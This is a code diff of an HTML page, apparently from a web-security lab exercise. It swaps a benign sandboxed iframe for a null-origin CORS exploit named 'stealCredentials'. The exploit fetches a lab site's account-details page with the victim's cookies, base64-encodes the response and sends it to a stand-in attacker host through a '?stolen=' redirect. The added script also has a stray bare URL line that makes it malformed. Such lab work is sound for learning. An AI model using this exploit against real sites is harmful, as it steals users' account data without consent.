@@ -13,32 +13,27 @@
     <div id="output" style="margin-top: 15px;">Status: Idle</div>
 
     <!-- 2. The Sandboxed Iframe (with the target script inside srcdoc) -->
-    <iframe sandbox="allow-scripts" style="display:none;" srcdoc="
-        <script>
-            // Listen for the 'trigger' message sent from the main page
-            window.addEventListener('message', function(event) {
-                if (event.data === 'trigger') {
-                    // Send cross-origin request (Origin will be 'null')
-                    fetch('http://localhost:3000/api/user-data', {
-                        method: 'GET',
-                        credentials: 'include'
-                    })
-                    .then(res => {
-                        if (!res.ok) throw new Error('HTTP status ' + res.status);
-                        return res.json();
-                    })
-                    .then(data => {
-                        // Pass success data back to top window
-                        window.top.postMessage({ status: 'success', data: data }, '*');
-                    })
-                    .catch(err => {
-                        // Pass error back to top window
-                        window.top.postMessage({ status: 'error', error: err.message }, '*');
-                    });
-                }
-            });
-        <\/script>
-    "></iframe>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+        async function stealCredentials() {
+        const targetUrl = 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails';
+        const attackerUrl = 'https://example.com';
+
+        https://YOUR-LAB-ID.web-security-academy.net/accountDetails
+
+        try
+        {
+            let response = await fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include'
+            })
+            let sensitiveData = await response.text()
+            parent.location = attackerUrl + '?stolen=' + btoa(sensitiveData)
+        
+        } catch (err) {
+            console.error(err);
+        }}
+        stealCredentials();
+    </script>"></iframe>
 
     <!-- 3. Your Classroom Script + Main Window Listener -->
     <script>
